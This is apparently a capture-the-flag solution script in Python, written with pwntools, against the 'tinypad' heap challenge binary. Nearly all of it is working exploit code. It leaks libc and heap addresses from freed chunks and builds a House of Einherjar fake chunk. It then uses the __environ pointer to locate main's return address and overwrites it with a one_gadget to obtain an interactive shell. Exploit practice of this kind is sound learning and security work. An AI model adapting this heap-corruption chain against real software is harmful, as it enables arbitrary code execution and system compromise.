#!/usr/bin/env python
# coding=utf-8
# Author : huzai24601
from pwn import *
from LibcSearcher import *
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context(arch='amd64',os='linux',log_level='debug')
myelf = ELF('./tinypad')
p=process(myelf.path)
libc  = ELF('/lib/x86_64-linux-gnu/libc.so.6')
s=lambda data :p.send(data)
sa=lambda delim,data :p.sendafter(delim, data)
sl=lambda data :p.sendline(data)
sla=lambda delim,data :p.sendlineafter(delim, data) 
r=lambda numb=4096 :p.recv(numb)
ru=lambda delims :p.recvuntil(delims)
uu64=lambda data :u64(data.ljust(8,'\x00'))
leak=lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
def debug():
    gdb.attach(p)
    pause()

def add(size,cont):
    sla('(CMD)>>> ','a')
    sla('(SIZE)>>> ',str(size))
    sla('(CONTENT)>>> ',cont)

def edit(index,cont):
    sla('(CMD)>>> ','e')
    sla('(INDEX)>>> ',str(index))
    sla('(CONTENT)>>> ',cont)
    sla('(Y/n)>>> ','Y')

def delete(index):
    sla('(CMD)>>> ','D')
    sla('(INDEX)>>> ',str(index))

# leak libc and heap_base
add(0x70,'b'*0x70)
add(0x70,'b'*0x70)
add(0xf0,'c'*0xf0)
add(0xf0,'d'*0x90)
delete(2)
delete(1)
# heap_addr show in fast bin
p.recvuntil('CONTENT: ')
heap_base = uu64(p.recvline().rstrip()) - 0x80
delete(3)
#libc_addr show in unstored bin
main_88 =  uu64(p.recvuntil('\x7f')[-6:]) 
libc_base = main_88 - 88 - 0x3c4b20
leak("libc_base",libc_base)
leak("heap_base",heap_base)
delete(4)


# house of einherjar
add(0x10,'A'*0x10)
# set chunk2's size,void check
add(0x100,'B'*0xf8 + p64(0x101))
add(0x100,'C'*0xf0)
add(0x100,'D'*0xf0)

# solve the offset between fakechunk and curchunk(chunk2)
tinypad = 0x602040
# fake is editable, use edit to modify it
fakechunk = tinypad + 0x20
offset = heap_base + 0x20 -fakechunk 
leak("offet",offset)
# create leagal fakechunk
payload = 'D'*0x20 + p64(0) + p64(0x101) + p64(fakechunk)*2
edit(3,payload)
debug()
delete(1)
# set chunk2's presize offset
add(0x18,'a'*0x10+p64(offset))
# triger houses of einherjar
delete(2)
debug()
# modify fakechunk's head
edit(4,'d'*0x20 + p64(0)+p64(0x101) + p64(main_88)*2)
debug()

one_gadget_addr = libc_base + 0xf1247
environ_pointer = libc_base + libc.symbols['__environ']
# change point of chunk1 and chunk2
# leak environ_pointer_addr 
padding = 'f'*0xd0 + 'a'*8 + p64(environ_pointer) + 'a'*8 + p64(0x602148)
add(0xf0,padding)
debug()
ru('CONTENT: ')
main_ret = uu64(p.recvline().rstrip()) - 0x8*30
leak("main_ret",main_ret)
# modify chunk1's point to main_ret 
edit(2,p64(main_ret))
debug()
# modify main_ret to onegadget
edit(1,p64(one_gadget_addr))
debug()
p.interactive()
